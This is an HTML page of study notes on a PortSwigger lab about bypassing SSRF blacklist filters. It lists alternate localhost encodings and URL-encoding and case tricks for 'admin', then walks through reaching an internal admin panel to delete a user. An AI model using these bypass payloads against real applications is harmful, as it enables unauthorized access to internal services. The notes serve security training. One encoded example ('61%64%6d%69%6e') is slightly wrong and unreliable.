<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SSRF with blacklist-based input filters</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SSRF with blacklist-based input filters</h1><br/><br /><br />Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. <br />In this situation, you can often circumvent the filter using various techniques:<br />• Using an alternative IP representation of 127.0.0.1, such as:<br />	http://127.1/<br />	http://0000::1:80/<br />	http://[::]:80/<br />	http://2130706433/<br />	http://whitelisted@127.0.0.1<br />	http://0x7f000001/<br />	http://017700000001<br />	http://0177.00.00.01<br />	http://localhost<br />• Registering your own domain name that resolves to 127.0.0.1. <br />   ◇ You can use spoofed.burpcollaborator.net for this purpose.<br />• Obfuscating blocked strings using URL encoding or case variation.<br />	<span style="color:#63452c;">example: “admin”</span><br />	URL encoding: <code>61%64%6d%69%6e</code>  <br />	Double URL encoding: <code>%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code><br />	<br />	<br />	<br />	<br />	<br /><strong><span style="color:#63452c;">Exercise:</span></strong><br /><br />1. Visit a product, click &quot;Check stock&quot;, intercept the request in Burp Suite, and send it to Burp Repeater.<br />	<a href=""><img src="images/2235-1.png" alt="images/2235-1.png" /></a><br />2. Change the URL in the <code>stockApi</code> parameter to <code>http://127.0.0.1/</code> and observe that the request is blocked.<br />	<a href=""><img src="images/2235-2.png" alt="images/2235-2.png" /></a><br />3. Try to bypass by changing the URL in the <code>stockApi</code> parameter<br />	<a href=""><img src="images/2235-3.png" alt="images/2235-3.png" /></a><br />	 <code>http://127.1/</code> bypass the filter<br /><br />4. Change the URL to <code>http://127.1/admin</code> and observe that the URL is blocked again.<br />	<a href=""><img src="images/2235-4.png" alt="images/2235-4.png" /></a><br />	It seems that the word “admin” is blocked lets try to bypass it with URL encoding or case variation<br />5. Obfuscate &quot;admin&quot; by URL encoding it to <code>61%64%6d%69%6e</code> to access the admin interface <br />	<a href=""><img src="images/2235-5.png" alt="images/2235-5.png" /></a><br />	NOT bypassed	<br />	<br />7. Double Encoding “admin” by double-URL-encoding it to <code>%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code><br />	<a href=""><img src="images/2235-6.png" alt="images/2235-6.png" /></a><br />	YESS bypassed<br /><br />8. Let&#39;s try to bypass it also with case varions, like from “admin” to “AdMiN”<br />	<a href=""><img src="images/2235-7.png" alt="images/2235-7.png" /></a><br />	YESS bypassed<br />	<br />9. Try to delete the target user with <code>/admin/delete?username=carlos</code><br />	<a href=""><img src="images/2235-8.png" alt="images/2235-8.png" /></a><br /><br /><br /><br /><br />Bibliography:<br /><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter">https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter</a></div>
</body>
</html>
